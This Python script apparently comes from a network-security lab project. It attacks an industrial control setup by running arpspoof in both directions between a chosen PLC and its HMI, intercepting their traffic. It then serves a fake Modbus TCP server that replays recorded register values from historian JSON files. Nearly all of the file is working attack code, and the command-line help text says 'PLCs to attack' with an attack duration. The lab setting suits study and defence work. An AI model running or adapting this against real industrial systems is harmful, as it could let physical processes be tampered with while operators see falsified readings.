# Modbus server (TCP)
from pymodbus.server import StartTcpServer
from pymodbus.device import ModbusDeviceIdentification
from pymodbus.datastore import ModbusSequentialDataBlock
from pymodbus.datastore import ModbusSlaveContext, ModbusServerContext
from threading import Thread
from twisted.internet.task import LoopingCall
import time
import os
from dict import Dict
import subprocess
import configparser
import argparse
import glob
from scapy.all import get_if_hwaddr



JSON_PATH = "./networkSecurityProject/registerCapture/historian/"
config_file = "/networkSecurityProject/config.ini"


holding_registers = [15, 20, 30, 40]
input_registers = [100, 200, 300, 400]
coils = [False, True, False, True, False, True, False, True]
discrete_inputs = [False, True, False, True, False, True, False, True]
# holding_registers = dict.holding_output_register_values
# input_registers = dict.input_register_values
# coils = dict.coil_values
# discrete_inputs = dict.discrete_input_values
print("hr", holding_registers)
print("ir", input_registers)
print("co", coils)
print("di", discrete_inputs)

context = None

def run_arpspoof(target_ip, gateway_ip):
    with open(os.devnull, 'w') as devnull:
        process = subprocess.Popen(['arpspoof', '-r', '-i', 'docker0', '-t', target_ip, gateway_ip], stdout=devnull, stderr=devnull)
    time.sleep(60)
    process.terminate()

def run_arpspoof_reverse(target_ip, gateway_ip):
    with open(os.devnull, 'w') as devnull:
        process = subprocess.Popen(['arpspoof', '-r', '-i', 'docker0', '-t', gateway_ip, target_ip], stdout=devnull, stderr=devnull)
    time.sleep(60)
    process.terminate()

def parse_config_file(config_file, plc_names):
    config = configparser.ConfigParser()
    config.read(config_file)

    plc_ips = []
    plc_ports = []
    hmi_ip = config.get("Network", "hmi_ip")
    hmi_port = config.get("Network", "hmi_port")

    for section in config.sections():
        if section.startswith('plc'):
            if plc_names and section not in plc_names:
                continue
            plc_ips.append(config.get(section, 'ip'))
            plc_ports.append(config.get(section, 'port'))

    return plc_ips, plc_ports, hmi_ip, hmi_port

def updating_writer(context, json_path):
    ''' A worker process that runs every so often and
    updates live values of the context. It should be noted
    that there is a race condition for the update.

    :param arguments: The input arguments to the call
    '''
    #log.debug("updating the context")
    (
        discrete_input_values,
        input_register_values,
        holding_output_register_values,
        memory_register_values,
        coil_values
    ) = Dict(json_path)
    #register = 3
    # address  = 0
    # values   = context[0].getValues(register, address, count=4)
    # values   = [v + 1 for v in values]
    #values = dict.json_file
    #log.debug("new values: " + str(values))
    context[0].setValues(2, 0, discrete_input_values)
    context[0].setValues(4, 0, input_register_values)
    context[0].setValues(3, 0, holding_output_register_values)
    context[0].setValues(3, len(holding_registers)+1, memory_register_values) # se non troviamo l'address iniziale partiamo da 1024
    context[0].setValues(1, 0, coil_values)

def run_async_server():
    # initialize data store
    global context
    store = ModbusSlaveContext(
        di=ModbusSequentialDataBlock(1, discrete_inputs),
        co=ModbusSequentialDataBlock(1, coils),
        hr=ModbusSequentialDataBlock(1, holding_registers),
        ir=ModbusSequentialDataBlock(1, input_registers))
    context = ModbusServerContext(slaves=store, single=True)
    
    # initialize the server information
    identity = ModbusDeviceIdentification()
    identity.VendorName = 'APMonitor'
    identity.ProductCode = 'APM'
    identity.VendorUrl = 'https://apmonitor.com'
    identity.ProductName = 'Modbus Server'
    identity.ModelName = 'Modbus Server'
    identity.MajorMinorRevision = '3.0.2'

    #thread = Thread(target=updating_writer, args=(context,))
    #thread.start()  

    times = 5 # 5 seconds delay
    loop = LoopingCall(f=updating_writer, a=(context,))
    loop.start(times, now=False) # initially delay by time
    
    
    thread = Thread(target=StartTcpServer, kwargs={"context":context,"host":'localhost',"identity":identity,"address":("127.0.0.1", 5030)})
    thread.start()
    
    # TCP Server
    #StartTcpServer(context=context, host='localhost',\
    #               identity=identity, address=("127.0.0.1", 5030))
    '''
    print("context:",context[0].getValues(3, 0, count=4))
    updating_writer(context)
    time.sleep(7)
    print("aaaaaaaa")
    print("context:",context[0].getValues(3, 0, count=4))
    updating_writer(context)
    '''
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--plc', nargs='+', required=True, help='PLCs to attack')
    parser.add_argument('--time', type=int, required=True, help='Attack duration in minutes')
    #parser.add_argument('--manual', action='store_true', help='Manually start the Modbus slaves')
    parser.add_argument('--condition', type=str, help='Condition to start the attack')
    args = parser.parse_args()

    prefixes = args.plc

    # if not args.time:
    #     print('Please provide the capture duration')
    #     return
    
    json_files = []
    for prefix in prefixes:
        json_files.extend(glob.glob(os.path.join(JSON_PATH, f"{prefix}*.json")))

    if not json_files:
        print('No PLC or JSON files found with the specified prefixes')
        return
    
    config = configparser.ConfigParser()
    config.read(config_file)

    plc_ips, plc_ports, hmi_ip, hmi_port = parse_config_file(config_file, args.plc)

    target_ip = plc_ips[0].split(":")[0]
    print("target_ip", target_ip)
    gateway_ip = hmi_ip
    print("gateway_ip", gateway_ip)
    attacker_mac = get_if_hwaddr('docker0')  # Replace "eth0" with your network interface name
    print("attacker_mac", attacker_mac)

    thread1 = Thread(target=run_arpspoof, args=(target_ip, gateway_ip))
    thread2 = Thread(target=run_arpspoof_reverse, args=(target_ip, gateway_ip))
    thread1.start()
    thread2.start()

    print('Modbus server started on localhost port: 5030')
    run_async_server()
    json_list = os.listdir(JSON_PATH)
    filtered_json_list = [x for x in json_list if x.split('-')[0] == "plc2"]
    filtered_json_list.sort()
    c = 0
    while True:
        time.sleep(2)
        tmp_path = os.path.join(JSON_PATH, filtered_json_list[c])
        updating_writer(context, tmp_path)
        #print("context:",context[0].getValues(3, 0, count=4))
        print("Path: ", filtered_json_list[c])
        c += 1
        if c >= len(filtered_json_list): break

if __name__ == "__main__":
    main()

